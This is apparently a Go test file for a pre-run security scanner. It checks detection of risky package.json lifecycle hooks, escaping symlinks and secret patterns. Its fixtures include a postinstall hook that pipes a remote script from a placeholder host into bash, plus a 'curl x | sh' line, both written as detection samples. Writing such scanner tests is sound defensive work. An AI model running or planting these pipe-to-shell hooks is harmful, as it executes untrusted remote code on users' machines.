package scanner

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/theworker02/beforerun/internal/model"
)

func TestDetectsPackageLifecycleAndPipeToShell(t *testing.T) {
	root := t.TempDir()
	content := `{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	summary, err := Scan(root, Options{Threshold: model.SeverityHigh})
	if err != nil {
		t.Fatal(err)
	}
	if !summary.ThresholdMet {
		t.Fatal("expected threshold to be met")
	}
	if !hasRule(summary.Findings, "BR001") || !hasRule(summary.Findings, "BR004") {
		t.Fatalf("expected BR001 and BR004, got %#v", summary.Findings)
	}
}

func TestIgnoresNodeModules(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "node_modules", "unsafe")
	if err := os.MkdirAll(path, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(path, "install.sh"), []byte("curl x | sh"), 0o755); err != nil {
		t.Fatal(err)
	}

	summary, err := Scan(root, Options{Threshold: model.SeverityLow})
	if err != nil {
		t.Fatal(err)
	}
	if len(summary.Findings) != 0 {
		t.Fatalf("expected ignored findings, got %#v", summary.Findings)
	}
}

func TestDetectsEscapingSymlink(t *testing.T) {
	root := t.TempDir()
	outside := filepath.Join(t.TempDir(), "outside.txt")
	if err := os.WriteFile(outside, []byte("outside"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "escape")); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}

	summary, err := Scan(root, Options{Threshold: model.SeverityHigh})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(summary.Findings, "BR011") {
		t.Fatalf("expected BR011, got %#v", summary.Findings)
	}
}

func TestDoesNotFlagRegexDefinitionAsSecret(t *testing.T) {
	root := t.TempDir()
	content := "package x\nvar likelySecret = regexp.MustCompile(`(?i)secret\\s*=`)\n"
	if err := os.WriteFile(filepath.Join(root, "rules.go"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	summary, err := Scan(root, Options{Threshold: model.SeverityHigh})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(summary.Findings, "BR006") {
		t.Fatalf("unexpected BR006 finding: %#v", summary.Findings)
	}
}

func hasRule(findings []model.Finding, rule string) bool {
	for _, finding := range findings {
		if finding.Rule == rule {
			return true
		}
	}
	return false
}
